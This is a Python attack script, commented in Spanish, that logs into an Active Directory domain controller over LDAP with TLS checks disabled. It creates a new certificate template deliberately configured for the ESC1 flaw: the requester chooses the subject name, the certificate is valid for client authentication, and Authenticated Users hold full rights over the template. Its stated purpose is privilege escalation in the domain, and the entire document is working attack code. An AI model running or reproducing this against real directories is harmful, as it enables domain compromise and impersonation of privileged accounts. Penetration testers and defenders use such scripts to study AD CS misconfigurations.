#!/usr/bin/env python3
"""
AD CS ESC1 - Crear Template de Certificado desde Cero - Crea un nuevo
template de certificado con enrollee-supplies-subject (ESC1) y EKU de
Client Authentication, permitiendo escalacion de privilegios en el dominio.

Requiere: ldap3, impacket
Uso: python3 adcs-create-template-esc1.py <DC_IP> <dominio> <usuario> <password>
  - Configurar TEMPLATE_NAME y OWNER_SID.
"""
import sys, ssl
from ldap3 import Server, Connection, Tls, ALL
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACL, ACCESS_ALLOWED_ACE, ACE, LDAP_SID, ACCESS_MASK

dc, dom, user, pw = sys.argv[1:5]
base = ','.join('DC=' + p for p in dom.split('.'))
cont = f'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}'

TEMPLATE_NAME = "CustomTemplate"
OWNER_SID = "S-1-5-11"  # Authenticated Users, or a specific user SID

dn = f'CN={TEMPLATE_NAME},{cont}'
AU = 'S-1-5-11'


def ace_for(sid):
    a = ACE()
    a['AceType'] = ACCESS_ALLOWED_ACE.ACE_TYPE
    a['AceFlags'] = 0
    inner = ACCESS_ALLOWED_ACE()
    m = ACCESS_MASK()
    m['Mask'] = 0x10000000
    inner['Mask'] = m
    s = LDAP_SID()
    s.fromCanonical(sid)
    inner['Sid'] = s
    a['Ace'] = inner
    return a


sd = SR_SECURITY_DESCRIPTOR()
sd['Revision'] = b'\x01'
sd['Sbz1'] = b'\x00'
sd['Control'] = 0x8004
o = LDAP_SID()
o.fromCanonical(OWNER_SID)
sd['OwnerSid'] = o
sd['GroupSid'] = o
dacl = ACL()
dacl['AclRevision'] = 4
dacl['Sbz1'] = 0
dacl['Sbz2'] = 0
dacl.aces = [ace_for(AU), ace_for(OWNER_SID)]
sd['Sacl'] = b''
sd['Dacl'] = dacl
sd_bytes = sd.getData()
print('[i] SD bytes:', len(sd_bytes))

tls = Tls(validate=ssl.CERT_NONE)
srv = Server(dc, use_ssl=True, tls=tls, get_info=ALL)
c = Connection(srv, user=f'{dom}\\{user}', password=pw,
               authentication='NTLM', auto_bind=True)
print('[+] bound')

attrs = {
    'objectClass': ['top', 'pKICertificateTemplate'],
    'displayName': [TEMPLATE_NAME],
    'revision': [100],
    'pKIDefaultKeySpec': [1],
    'pKIMaxIssuingDepth': [0],
    'pKICriticalExtensions': ['2.5.29.15'],
    'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
    'msPKI-Certificate-Application-Policy': ['1.3.6.1.5.5.7.3.2'],
    'msPKI-Template-Schema-Version': [1],
    'msPKI-RA-Signature': [0],
    'msPKI-Enrollment-Flag': [0],
    'msPKI-Private-Key-Flag': [16],
    'msPKI-Certificate-Name-Flag': [1],
    'msPKI-Minimal-Key-Size': [2048],
    'flags': [66048],
    'pKIDefaultCSPs': ['1,Microsoft Enhanced Cryptographic Provider v1.0'],
    'pKIKeyUsage': [b'\x86\x00'],
    'pKIExpirationPeriod': [b'\x00\x40\x39\x87\x2e\xe1\xfe\xff'],
    'pKIOverlapPeriod': [b'\x00\x80\xa6\x0a\xff\xde\xff\xff'],
    'nTSecurityDescriptor': [sd_bytes],
}

print('[+] CREATED (ESC1):', dn) if c.add(dn, attributes=attrs) \
    else print('[-] add:', c.result)
